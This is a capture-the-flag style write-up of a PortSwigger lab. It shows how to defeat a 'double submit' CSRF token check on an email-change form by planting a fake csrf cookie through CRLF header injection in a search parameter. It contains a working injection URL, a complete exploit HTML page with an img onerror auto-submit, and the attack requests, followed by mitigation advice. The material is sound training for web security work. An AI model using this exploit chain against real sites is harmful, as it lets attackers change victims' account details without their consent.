# 📘 PortSwigger Lab: CSRF where token is duplicated in cookie

<a id="top"></a>

🔗 **Official Lab:** https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie  
🎯 **Topic:** CSRF — insecure "double submit" cookie technique + CRLF cookie injection  
🧪 **Difficulty:** Practitioner  
✅ **Status:** Solved  
🛠 **Tools:** Burp Suite (Proxy, Repeater), Exploit Server  
🔑 **Credentials:** `wiener:peter`

---

## 📑 Contents
- [📘 PortSwigger Lab: CSRF where token is duplicated in cookie](#-portswigger-lab-csrf-where-token-is-duplicated-in-cookie)
  - [📑 Contents](#-contents)
  - [🎯 Goal](#-goal)
  - [🧠 Short Theory](#-short-theory)
  - [🧩 Core Idea](#-core-idea)
  - [🗺 Attack Scheme](#-attack-scheme)
  - [🔍 Step 1 — Analyze Legitimate Request](#-step-1--analyze-legitimate-request)
  - [🔍 Step 2 — Verify "Double Submit" Validation](#-step-2--verify-double-submit-validation)
  - [🔍 Step 3 — Find Cookie Injection Point](#-step-3--find-cookie-injection-point)
  - [🔍 Step 4 — Build CSRF Exploit with Cookie Injection](#-step-4--build-csrf-exploit-with-cookie-injection)
  - [🔍 Step 5 — Test Exploit on Yourself](#-step-5--test-exploit-on-yourself)
  - [🔍 Step 6 — Deliver Exploit to Victim](#-step-6--deliver-exploit-to-victim)
  - [📨 Example Requests](#-example-requests)
  - [📥 Example Result](#-example-result)
  - [🧾 Complete Attack Chain](#-complete-attack-chain)
  - [🔬 Why the Attack Worked](#-why-the-attack-worked)
  - [🧠 Pentester Mindset](#-pentester-mindset)
  - [❌ Common Mistakes](#-common-mistakes)
  - [🛡 Mitigation](#-mitigation)
  - [✅ Checklist](#-checklist)
  - [🧾 Conclusion](#-conclusion)

---

<a id="goal"></a>
## 🎯 Goal
The email change functionality is protected by the insecure **"double submit"** CSRF prevention technique: the `csrf` body parameter is validated by comparing it against the `csrf` **cookie**. The task:

1. Use the exploit server to host an HTML page that performs a CSRF attack.
2. Change the victim's email address via CSRF.

<a id="theory"></a>
## 🧠 Short Theory
The "double submit cookie" pattern stores the CSRF token in both a cookie and the request body, then validates that they match. The design assumes an attacker **cannot set cookies** in the victim's browser for the target domain.

However, if any endpoint reflects user input into the `Set-Cookie` response header (CRLF injection), the attacker can plant an **arbitrary fake csrf cookie** in the victim's browser cross-origin. The attacker then submits a form whose `csrf` parameter carries the **same fake value** — cookie and parameter match, validation passes, and the token provides zero protection.

<a id="idea"></a>
## 🧩 Core Idea
Validation = `cookie csrf` == `body csrf`. Both halves are attacker-controllable:

1. **Cookie half:** inject `csrf=fake` into the victim's browser via CRLF injection in the unprotected search endpoint (`/?search=test%0d%0aSet-Cookie: csrf=fake; SameSite=None`).
2. **Body half:** the exploit form simply contains `<input name="csrf" value="fake">`.

No knowledge of any server-issued token is required — the "secret" is fully fabricated by the attacker.

<a id="attack-scheme"></a>
## 🗺 Attack Scheme
1. **Recon:** Intercept `POST /my-account/change-email`; note the `csrf` cookie and `csrf` body parameter.
2. **Verify:** Change one of the pair → rejected; the server only compares cookie vs parameter.
3. **Injection point:** Search term is reflected into `Set-Cookie` → CRLF cookie injection.
4. **Exploit:** `<img>` injects `csrf=fake` cookie, `onerror` submits form with `csrf=fake`.
5. **Test:** View exploit on yourself → email changed.
6. **Deliver:** Deliver to victim → lab solved.

<a id="step1"></a>
## 🔍 Step 1 — Analyze Legitimate Request
Logged in as `wiener:peter` in Burp's browser, submitted the "Update email" form, and found the request in Proxy history. Sent it to Repeater.

```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER; csrf=CSRF_TOKEN_FROM_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN_FROM_BODY
```

Note: the token exists **twice** — as a cookie and as a body parameter.

<a id="step2"></a>
## 🔍 Step 2 — Verify "Double Submit" Validation
In Repeater, tested the validation logic:

- Changed only the `csrf` body parameter → rejected ("Invalid CSRF token").
- Changed both the `csrf` cookie **and** the `csrf` parameter to the same arbitrary value → **accepted**.

*Conclusion: the server simply compares the cookie with the body parameter. No session binding, no server-side token store — any self-consistent pair passes.*

<a id="step3"></a>
## 🔍 Step 3 — Find Cookie Injection Point
Performed a **search** on the site and sent the request to Repeater.

Observed that the search term is **reflected in the `Set-Cookie` response header**. The search function has **no CSRF protection**, so any origin can trigger it and plant a cookie in the victim's browser.

PoC injection URL (URL-encoded CRLF `%0d%0a`):

```
/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None
```

- `%0d%0a` — CRLF, breaking out of the reflected value into a new header.
- `SameSite=None` — mandatory, so the injected cookie is sent on cross-site requests.

<a id="step4"></a>
## 🔍 Step 4 — Build CSRF Exploit with Cookie Injection
Created the exploit from the email-change request with the `csrf` parameter set to `fake`, removed the auto-submit `<script>` block, and added an `<img>` that injects the cookie and submits the form in its `onerror` handler:

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="csrf" value="fake">
    <input type="hidden" name="email" value="attacker@web-security-academy.net">
</form>
<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();">
```

**How it works:**
1. The `<img>` triggers a GET to the vulnerable search endpoint → the response contains `Set-Cookie: csrf=fake; SameSite=None` → the victim's browser now holds the fake cookie.
2. The image fails to render → `onerror` fires → the form is submitted with `csrf=fake`.
3. Cookie `csrf=fake` == parameter `csrf=fake` → validation passes → email changed.

<a id="step5"></a>
## 🔍 Step 5 — Test Exploit on Yourself
Pasted the HTML into the exploit server "Body" field, stored it, and clicked "View exploit". Confirmed the email was changed.

⚠️ Per the hint: emails must be unique — use a **different** email address in the final exploit than the one used during testing.

<a id="step6"></a>
## 🔍 Step 6 — Deliver Exploit to Victim
Updated the email in the exploit to a fresh unused address, stored it, and clicked "Deliver to victim". The victim's email was changed → lab solved.

<a id="requests"></a>
## 📨 Example Requests
**Legitimate request (double submit)**
```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER; csrf=CSRF_TOKEN_FROM_COOKIE
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN_FROM_BODY
```

**Validation bypass (self-consistent fake pair)**
```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_VICTIM; csrf=fake
Content-Type: application/x-www-form-urlencoded

email=attacker@web-security-academy.net&csrf=fake
```

**Cookie injection via search endpoint**
```http
GET /?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None HTTP/2
Host: LAB-ID.web-security-academy.net
```

<a id="response"></a>
## 📥 Example Result
**Validation Check**
- Mismatched cookie/parameter → "Invalid CSRF token" (rejected)
- Self-consistent arbitrary pair (`csrf=fake` in both cookie and body) → 302 Redirect (success)

**Cookie Injection Check**
- `GET /?search=test%0d%0aSet-Cookie: csrf=fake...` → response contains `Set-Cookie: csrf=fake; SameSite=None`  
→ CRLF injection works, fake cookie is plantable cross-origin

**Exploit**
- Victim's session + injected `csrf=fake` cookie + `csrf=fake` parameter → 302 Redirect (success)  
→ Email changed with a fully fabricated token

<a id="attack-chain"></a>
## 🧾 Complete Attack Chain
1. Login as wiener → intercept `POST /my-account/change-email` → note csrf cookie + csrf parameter.
2. Repeater: confirm validation is only cookie-vs-parameter comparison.
3. Search endpoint → reflected into `Set-Cookie` → CRLF cookie injection.
4. Exploit: `<img>` injects `csrf=fake` (SameSite=None), `onerror` submits form with `csrf=fake`.
5. View exploit → test on yourself → email changed.
6. Fresh email address in exploit → Deliver to victim → **Solved**.

<a id="breakdown"></a>
## 🔬 Why the Attack Worked
- **Weak primitive:** the "double submit" pattern only proves the cookie and parameter match — it does not prove the request was intentionally made by the user.
- **Both halves attacker-controlled:** the CRLF injection lets the attacker set the cookie; the form HTML contains the parameter. The comparison compares attacker data with attacker data.
- **No server-side state:** the token is not stored in the session, so there is nothing to bind or verify server-side.
- **SameSite=None:** the injected cookie is explicitly marked to be sent on cross-site requests.
- **Chained primitives:** header injection (GET, no CSRF protection) + form auto-submit (POST) = full bypass.

<a id="pentester"></a>
## 🧠 Pentester Mindset
1. **Ask what the validation actually compares:** token-vs-session is strong; token-vs-cookie ("double submit") is weak if cookies are injectable.
2. **Test with a self-consistent fake pair:** change both cookie and parameter to the same arbitrary value — if it passes, the token is decorative.
3. **Look for cookie injection points:** reflected `Set-Cookie` headers (CRLF) turn "weak pattern" into "zero protection".
4. **Remember SameSite:** injected cookies need `SameSite=None` to be sent on cross-site requests.
5. **Chain primitives:** the search field's harmless reflection is the key that unlocks the whole bypass.

<a id="mistakes"></a>
## ❌ Common Mistakes
- **Only changing the body parameter:** a mismatched pair is rejected — both halves must be attacker-set to the **same** value.
- **Leaving the auto-submit `<script>`:** the script fires before the `<img>` finishes setting the cookie — remove it and submit from `onerror`.
- **Token value mismatch:** the injected cookie value must exactly match the form's `csrf` value (`fake` == `fake`).
- **Forgetting SameSite=None in the injection:** without it the browser won't send the injected cookie on the cross-site POST.
- **URL-encoding errors:** `%0d%0a` for CRLF, `%3b` for `;`, `%20` for spaces — unencoded characters break the header injection.
- **Using the same email in test and final exploit:** emails are unique; the final exploit needs a different address.

<a id="defense"></a>
## 🛡 Mitigation
- **Tie the CSRF token to the session** — store the token server-side in the session object and validate (session, token), not cookie-vs-parameter.
- The double submit pattern is only acceptable if the cookie is **set by the server with an unpredictable value** and the cookie is **httpOnly-protected from injection** — here it is not.
- **Eliminate CRLF injection** — reject CR/LF in any input reflected into response headers; modern frameworks block header injection by default.
- **SameSite cookies** (Lax/Strict) for the session cookie as defense in depth.
- Check **Origin/Referer** headers for state-changing requests.

<a id="checklist"></a>
## ✅ Checklist
- [ ] Captured csrf cookie + csrf body parameter from wiener's request
- [ ] Confirmed: validation is only cookie-vs-parameter comparison
- [ ] Search endpoint reflects into Set-Cookie (CRLF injection)
- [ ] Built exploit: `<img>` injects `csrf=fake` + form with `csrf=fake`, submit via `onerror`
- [ ] SameSite=None included in the injected cookie
- [ ] View exploit → tested on yourself → email changed
- [ ] Fresh, non-matching email in the final exploit
- [ ] Deliver to victim → lab solved
- [ ] Status: **Solved**

<a id="conclusion"></a>
## 🧾 Conclusion
The lab demonstrates why the "double submit cookie" pattern fails when an attacker can set cookies: the validation compares two attacker-controllable values. CRLF injection in an unprotected endpoint lets the attacker plant `csrf=fake` in the victim's browser, and the form carries the same value — the check passes by construction. The key lesson: the strength of any CSRF defense depends on which values the attacker cannot control; if every input to the comparison is injectable, the defense is theater.

⬆ [Back to top](#top)